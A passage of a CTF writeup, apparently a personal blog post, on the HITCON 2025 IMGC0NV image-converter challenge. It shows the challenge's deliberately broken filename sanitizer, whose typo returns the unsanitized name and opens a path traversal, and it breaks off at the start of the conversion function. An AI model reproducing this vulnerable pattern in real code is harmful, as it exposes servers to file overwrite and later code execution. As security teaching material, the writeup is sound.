<!doctype html><html lang=en dir=ltr class=scroll-smooth data-default-appearance=dark data-auto-appearance=false><head><meta charset=utf-8><meta http-equiv=content-language content="en"><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=X-UA-Compatible content="ie=edge"><meta name=theme-color><title>HITCON 2025 – IMGC0NV &#183; [root@rolbk.com]#</title><meta name=title content="HITCON 2025 – IMGC0NV &#183; [root@rolbk.com]#"><meta name=description content="A writeup about exploiting an image converter service through path traversal and multiprocessing pickle deserialization. The solution required crafting a polyglot file that's both a valid BMP image and a malicious pickle payload to achieve RCE."><meta name=keywords content="Writeup,CTF,HITCON 2025,Web Security,Python,Pickle,Polyglot,"><link rel=canonical href=/posts/hitcon2025-imgc0nv/><link type=text/css rel=stylesheet href=/css/main.bundle.min.db15651319416dc23c09716c6bfad333663de46f0b1634dd77228e3d4e350ca3fbb38193699e7e36ded41b245e010f69c5d8428ef1646be3b37248366e6ee201.css integrity="sha512-2xVlExlBbcI8CXFsa/rTM2Y95G8LFjTddyKOPU41DKP7s4GTaZ5+Nt7UGyReAQ9pxdhCjvFka+Ozckg2bm7iAQ=="><script type=text/javascript src=/js/appearance.min.516a16745bea5a9bd011138d254cc0fd3973cd55ce6e15f3dec763e7c7c2c7448f8fe7b54cca811cb821b0c7e12cd161caace1dd794ac3d34d40937cbcc9ee12.js integrity="sha512-UWoWdFvqWpvQERONJUzA/TlzzVXObhXz3sdj58fCx0SPj+e1TMqBHLghsMfhLNFhyqzh3XlKw9NNQJN8vMnuEg=="></script><script defer type=text/javascript id=script-bundle src=/js/main.bundle.min.a187118b41a60744310065c567365de85730c8495301d0ebae41810cc6f7a47432b1de7d4f3b11338959f1ac50c266be6b4b73acf6bf770016eb59b602cc1aa0.js integrity="sha512-oYcRi0GmB0QxAGXFZzZd6FcwyElTAdDrrkGBDMb3pHQysd59TzsRM4lZ8axQwma+a0tzrPa/dwAW61m2AswaoA==" data-copy=Copy data-copied=Copied></script><script src=/lib/zoom/zoom.min.umd.a527109b68c082a70f3697716dd72a9d5aa8b545cf800cecbbc7399f2ca6f6e0ce3e431f2062b48bbfa47c9ea42822714060bef309be073f49b9c0e30d318d7b.js integrity="sha512-pScQm2jAgqcPNpdxbdcqnVqotUXPgAzsu8c5nyym9uDOPkMfIGK0i7+kfJ6kKCJxQGC+8wm+Bz9JucDjDTGNew=="></script><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/site.webmanifest><meta property="og:url" content="/posts/hitcon2025-imgc0nv/"><meta property="og:site_name" content="[root@rolbk.com]#"><meta property="og:title" content="HITCON 2025 – IMGC0NV"><meta property="og:description" content="A writeup about exploiting an image converter service through path traversal and multiprocessing pickle deserialization. The solution required crafting a polyglot file that’s both a valid BMP image and a malicious pickle payload to achieve RCE."><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2025-08-29T00:00:00+00:00"><meta property="article:modified_time" content="2025-08-29T00:00:00+00:00"><meta property="article:tag" content="Writeup"><meta property="article:tag" content="CTF"><meta property="article:tag" content="HITCON 2025"><meta property="article:tag" content="Web Security"><meta property="article:tag" content="Python"><meta property="article:tag" content="Pickle"><meta property="og:image" content="/posts/hitcon2025-imgc0nv/featured.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="/posts/hitcon2025-imgc0nv/featured.png"><meta name=twitter:title content="HITCON 2025 – IMGC0NV"><meta name=twitter:description content="A writeup about exploiting an image converter service through path traversal and multiprocessing pickle deserialization. The solution required crafting a polyglot file that’s both a valid BMP image and a malicious pickle payload to achieve RCE."><meta name=twitter:image content="/posts/hitcon2025-imgc0nv/featured.png"><meta property="og:image" content="/posts/hitcon2025-imgc0nv/featured.png"><script type=application/ld+json>[{"@context":"https://schema.org","@type":"Article","articleSection":"Posts","name":"HITCON 2025 – IMGC0NV","headline":"HITCON 2025 – IMGC0NV","abstract":"A writeup about exploiting an image converter service through path traversal and multiprocessing pickle deserialization. The solution required crafting a polyglot file that\u0026rsquo;s both a valid BMP image and a malicious pickle payload to achieve RCE.","inLanguage":"en","url":"\/posts\/hitcon2025-imgc0nv\/","author":{"@type":"Person","name":"Emanuel Mairoll"},"copyrightYear":"2025","dateCreated":"2025-08-29T00:00:00\u002b00:00","datePublished":"2025-08-29T00:00:00\u002b00:00","dateModified":"2025-08-29T00:00:00\u002b00:00","keywords":["Writeup","CTF","HITCON 2025","Web Security","Python","Pickle","Polyglot"],"mainEntityOfPage":"true","wordCount":"2660"}]</script><meta name=author content="Emanuel Mairoll"><link href=https://github.com/EmanuelMairoll rel=me><link href=https://stackoverflow.com/users/18277713/emanuelm rel=me><link href=https://www.linkedin.com/in/emanuel-mairoll-512458164/ rel=me><script src=/lib/jquery/jquery.slim.min.b0dca576e87d7eaa5850ae4e61759c065786cdb6489d68fcc82240539eebd5da522bdb4fda085ffd245808c8fe2acb2516408eb774ef26b5f6015fc6737c0ea8.js integrity="sha512-sNylduh9fqpYUK5OYXWcBleGzbZInWj8yCJAU57r1dpSK9tP2ghf/SRYCMj+KsslFkCOt3TvJrX2AV/Gc3wOqA=="></script></head><body class="flex flex-col h-screen px-6 m-auto text-lg leading-7 max-w-7xl bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32 scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600"><div id=the-top class="absolute flex self-center"><a class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600" href=#main-content><span class="font-bold text-primary-600 ltr:pr-2 rtl:pl-2 dark:text-primary-400">&darr;</span>
Skip to main content</a></div><div class=min-h-[148px]></div><div class="fixed inset-x-0 pl-[24px] pr-[24px] z-100"><div id=menu-blur class="absolute opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-2xl shadow-2xl"></div><div class="relative max-w-[64rem] ml-auto mr-auto"><div class="main-menu flex items-center justify-between px-4 py-6 sm:px-6 md:justify-start gap-x-3 pt-[2px] pr-0 pb-[3px] pl-0"><div class="flex flex-1 items-center justify-between"><nav class="flex space-x-3"><a href=/ class="text-base font-medium text-gray-500 hover:text-gray-900">[root@rolbk.com]#</a></nav><nav class="hidden md:flex items-center gap-x-5 md:ml-12 h-12"><a href=/posts/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-base font-medium" title=Posts>Posts</p></a><a href=/projects/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-base font-medium" title="Under Construction ;-)">Projects</p></a><a href=/resume/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-base font-medium" title=Resume>Resume</p></a><a href=https://github.com/rolbk target=_blank class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><span><span class="relative block icon"><svg viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6.0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6.0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3.0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1.0-6.2-.3-40.4-.3-61.4.0.0-70 15-84.7-29.8.0.0-11.4-29.1-27.8-36.6.0.0-22.9-15.7 1.6-15.4.0.0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5.0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9.0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4.0 33.7-.3 75.4-.3 83.6.0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6.0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9.0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg></span></span><p class="text-base font-medium" title></p></a><button id=search-button aria-label=Search class="text-base hover:text-primary-600 dark:hover:text-primary-400" title="Search (/)">
<span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg></span></button><div class="flex items-center"><button id=appearance-switcher aria-label="Dark mode switcher" type=button class="text-base hover:text-primary-600 dark:hover:text-primary-400"><div class="flex items-center justify-center dark:hidden"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M32 256C32 132.2 132.3 32 255.8 32c11.36.0 29.7 1.668 40.9 3.746 9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3 9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480 132.1 480 32 379.6 32 256z"/></svg></span></div><div class="items-center justify-center hidden dark:flex"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02.0-95.1 42.98-95.1 95.1s41.2 96.9 95.1 96.9 95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347l-63.2-91.9 63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89 164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6 12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256 2.74 347.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7 19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109 109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69.0-127.1-57.31-127.1-127.1.0-70.69 57.31-127.1 127.1-127.1S383.1 186.2 383.1 256c0 70.7-56.4 127.1-127.1 127.1z"/></svg></span></div></button></div></nav><div class="flex md:hidden items-center gap-x-5 md:ml-12 h-12"><span></span>
<button id=search-button-mobile aria-label=Search class="text-base hover:text-primary-600 dark:hover:text-primary-400" title="Search (/)">
<span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
</span></button>
<button id=appearance-switcher-mobile aria-label="Dark mode switcher" type=button class="text-base hover:text-primary-600 dark:hover:text-primary-400 ltr:mr-1 rtl:ml-1"><div class="flex items-center justify-center dark:hidden"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M32 256C32 132.2 132.3 32 255.8 32c11.36.0 29.7 1.668 40.9 3.746 9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3 9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480 132.1 480 32 379.6 32 256z"/></svg></span></div><div class="items-center justify-center hidden dark:flex"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02.0-95.1 42.98-95.1 95.1s41.2 96.9 95.1 96.9 95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347l-63.2-91.9 63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89 164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6 12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256 2.74 347.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7 19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109 109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69.0-127.1-57.31-127.1-127.1.0-70.69 57.31-127.1 127.1-127.1S383.1 186.2 383.1 256c0 70.7-56.4 127.1-127.1 127.1z"/></svg></span></div></button></div></div><div class="-my-2 md:hidden"><div id=menu-button class=block><div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400"><span class="relative block icon"><svg viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416c17.7.0 32 14.33 32 32 0 17.7-14.3 32-32 32H32C14.33 128 0 113.7.0 96zM0 256c0-17.7 14.33-32 32-32H416c17.7.0 32 14.3 32 32s-14.3 32-32 32H32c-17.67.0-32-14.3-32-32zM416 448H32c-17.67.0-32-14.3-32-32s14.33-32 32-32H416c17.7.0 32 14.3 32 32s-14.3 32-32 32z"/></svg></span></div><div id=menu-wrapper class="fixed inset-0 z-30 invisible w-screen h-screen m-0 overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50 pt-[5px]"><ul class="flex space-y-2 mt-3 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none ltr:text-right rtl:text-left max-w-7xl"><li id=menu-close-button><span class="cursor-pointer inline-block align-text-bottom hover:text-primary-600 dark:hover:text-primary-400"><span class="relative block icon"><svg viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75.0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3 54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75.0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75.0-45.25s32.75-12.5 45.25.0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25.0s12.5 32.75.0 45.25l-105.4 105.4L310.6 361.4z"/></svg></span></span></li><li class=mt-1><a href=/posts/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-bg font-bg" title=Posts>Posts</p></a></li><li class=mt-1><a href=/projects/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-bg font-bg" title="Under Construction ;-)">Projects</p></a></li><li class=mt-1><a href=/resume/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-bg font-bg" title=Resume>Resume</p></a></li><li class=mt-1><a href=https://github.com/rolbk target=_blank class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><div><span class="relative block icon"><svg viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6.0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6.0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3.0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1.0-6.2-.3-40.4-.3-61.4.0.0-70 15-84.7-29.8.0.0-11.4-29.1-27.8-36.6.0.0-22.9-15.7 1.6-15.4.0.0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5.0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9.0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4.0 33.7-.3 75.4-.3 83.6.0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6.0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9.0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg></span></div><p class="text-bg font-bg" title></p></a></li></ul></div></div></div></div></div></div><script type=text/javascript src=/js/background-blur.min.0ad33cb9c066f652728b2cc09c9ceaf32645544f48e8b6b38f120d86f433ed997da275a49e6151fe0176430c45376812708d84727f3f969101fb44a4345b3f34.js integrity="sha512-CtM8ucBm9lJyiyzAnJzq8yZFVE9I6LazjxINhvQz7Zl9onWknmFR/gF2QwxFN2gScI2Ecn8/lpEB+0SkNFs/NA==" data-target-id=menu-blur></script><div class="relative flex flex-col grow"><main id=main-content class=grow><article><div id=hero class="h-[150px] md:h-[200px]"></div><div class="fixed inset-x-0 top-0 h-[800px] single_hero_background nozoom"><img id=background-image src=/posts/hitcon2025-imgc0nv/featured_hu_8c7d93020536612a.png alt="Background Image" class="absolute inset-0 w-full h-full object-cover"><div class="absolute inset-0 bg-gradient-to-t from-neutral dark:from-neutral-800 to-transparent mix-blend-normal"></div><div class="absolute inset-0 opacity-60 bg-gradient-to-t from-neutral dark:from-neutral-800 to-neutral-100 dark:to-neutral-800 mix-blend-normal"></div></div><div id=background-blur class="fixed opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-2xl"></div><script type=text/javascript src=/js/background-blur.min.0ad33cb9c066f652728b2cc09c9ceaf32645544f48e8b6b38f120d86f433ed997da275a49e6151fe0176430c45376812708d84727f3f969101fb44a4345b3f34.js integrity="sha512-CtM8ucBm9lJyiyzAnJzq8yZFVE9I6LazjxINhvQz7Zl9onWknmFR/gF2QwxFN2gScI2Ecn8/lpEB+0SkNFs/NA==" data-target-id=background-blur data-image-id=background-image data-image-url=/posts/hitcon2025-imgc0nv/featured.png></script><header id=single_header class="mt-5 max-w-prose"><h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">HITCON 2025 – IMGC0NV</h1><div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden"><div class="flex flex-row flex-wrap items-center"><time datetime=2025-08-29T00:00:00+00:00>29 August 2025</time><span class="px-2 text-primary-500">&#183;</span><span>2660 words</span><span class="px-2 text-primary-500">&#183;</span><span title="Reading time">13 mins</span></div><div class="flex flex-row flex-wrap items-center"><a class="relative mt-[0.5rem] mr-2" href=/tags/writeup/><span class="flex cursor-pointer"><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Writeup
</span></span></a><a class="relative mt-[0.5rem] mr-2" href=/tags/ctf/><span class="flex cursor-pointer"><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">CTF
</span></span></a><a class="relative mt-[0.5rem] mr-2" href=/tags/hitcon-2025/><span class="flex cursor-pointer"><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">HITCON 2025
</span></span></a><a class="relative mt-[0.5rem] mr-2" href=/tags/web-security/><span class="flex cursor-pointer"><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Web Security
</span></span></a><a class="relative mt-[0.5rem] mr-2" href=/tags/python/><span class="flex cursor-pointer"><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Python
</span></span></a><a class="relative mt-[0.5rem] mr-2" href=/tags/pickle/><span class="flex cursor-pointer"><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Pickle
</span></span></a><a class="relative mt-[0.5rem] mr-2" href=/tags/polyglot/><span class="flex cursor-pointer"><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Polyglot</span></span></a></div></div></header><section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row"><div class="order-first lg:ml-auto px-0 lg:order-last ltr:lg:pl-8 rtl:lg:pr-8"><div class="toc ltr:pl-5 rtl:pr-5 print:hidden lg:sticky lg:top-[140px]"><details open id=TOCView class="toc-right mt-0 overflow-y-auto overscroll-contain scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600 rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 hidden lg:block"><summary class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">Table of Contents</summary><div class="min-w-[220px] py-2 border-dotted ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600"><nav id=TableOfContents><ul><li><a href=#challenge-overview>Challenge Overview</a></li><li><a href=#easiest-shell-ever-the-very-obvious-path-traversal>Easiest shell ever? The very obvious path traversal</a></li><li><a href=#constraints--limitations>Constraints & limitations</a><ul><li><a href=#red-herrings-llm-bait>Red herrings (LLM bait)</a></li></ul></li><li><a href=#abusing-the-multiprocessing-pool-ipc>Abusing the multiprocessing pool IPC</a></li><li><a href=#fd6jpg->fd/6.jpg ?</a></li><li><a href=#polyglot-time>Polyglot time</a><ul><li><a href=#constraints-recap>Constraints recap</a></li><li><a href=#the-pickle-payload>The Pickle Payload</a></li><li><a href=#size-restrictions>Size Restrictions</a></li><li><a href=#final-polyglot>Final polyglot:</a></li></ul></li><li><a href=#final-exploit>Final exploit</a></li><li><a href=#final-remarks>Final Remarks</a></li></ul></nav></div></details><details class="toc-inside mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 lg:hidden"><summary class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">Table of Contents</summary><div class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600"><nav id=TableOfContents><ul><li><a href=#challenge-overview>Challenge Overview</a></li><li><a href=#easiest-shell-ever-the-very-obvious-path-traversal>Easiest shell ever? The very obvious path traversal</a></li><li><a href=#constraints--limitations>Constraints & limitations</a><ul><li><a href=#red-herrings-llm-bait>Red herrings (LLM bait)</a></li></ul></li><li><a href=#abusing-the-multiprocessing-pool-ipc>Abusing the multiprocessing pool IPC</a></li><li><a href=#fd6jpg->fd/6.jpg ?</a></li><li><a href=#polyglot-time>Polyglot time</a><ul><li><a href=#constraints-recap>Constraints recap</a></li><li><a href=#the-pickle-payload>The Pickle Payload</a></li><li><a href=#size-restrictions>Size Restrictions</a></li><li><a href=#final-polyglot>Final polyglot:</a></li></ul></li><li><a href=#final-exploit>Final exploit</a></li><li><a href=#final-remarks>Final Remarks</a></li></ul></nav></div></details></div></div><div class="min-w-0 min-h-0 max-w-fit"><div class="article-content max-w-prose mb-20"><p>Last weekend I competed in HITCON CTF 2025 together with the 0rganizers. I spent most of my time on the IMGC0NV web challenge, which looked deceptively simple at first - just abusing a trivial path traversal - but it unfolded into a cursed polyglot trick to land remote code execution through OS pipes.</p><h2 class="relative group">Challenge Overview<div id=challenge-overview class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#challenge-overview aria-label=Anchor>#</a></span></h2><p>IMGC0NV is a very simple bulk image converter: a website where you upload a bunch of images, pick an output format, and get back a zip with the converted images. It’s implemented in Flask and uses the popular Pillow library for image decoding and re-encoding. Images are converted concurrently in a threadpool, so multiple files are processed in parallel. We were handed the full source code and Docker image to replicate the environment exactly. The objective is to obtain a shell as the webserver user in order to run the <code>/readflag</code> command.</p><h2 class="relative group">Easiest shell ever? The very obvious path traversal<div id=easiest-shell-ever-the-very-obvious-path-traversal class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#easiest-shell-ever-the-very-obvious-path-traversal aria-label=Anchor>#</a></span></h2><p>At first glance this is the easiest bug on earth. Uploaded images are written to a temp directory, and the server builds the destination path from the <strong>user-controlled filename</strong> plus the chosen output format. There is a sanitizer - but it’s broken in a wonderfully fatal way:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>safe_filename</span>(filename):
</span></span><span style=display:flex><span>    filneame <span style=color:#f92672>=</span> filename<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#34;/&#34;</span>, <span style=color:#e6db74>&#34;_&#34;</span>)<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#34;..&#34;</span>, <span style=color:#e6db74>&#34;_&#34;</span>)
</span></span><span style=display:flex><span>    <span style=color:#75715e>#  ^</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># TYPO HERE</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> filename  <span style=color:#75715e># returns the original, unsanitized name</span>
</span></span></code></pre></div><p>The output name and path are then constructed from that &ldquo;sanitized&rdquo; value and the requested format:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>convert_image</span>(args):
</span></span><span style=display:flex><span>    file_data, filename, output_format, temp_dir <span style=color:#f92672>=</span> args
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>with</span> Image<span style=color:#f92672>.</span>open(io<span style=color:#f92672>.</span>BytesIO(file_data)) <span style=color:#66d9ef>as</span> img:
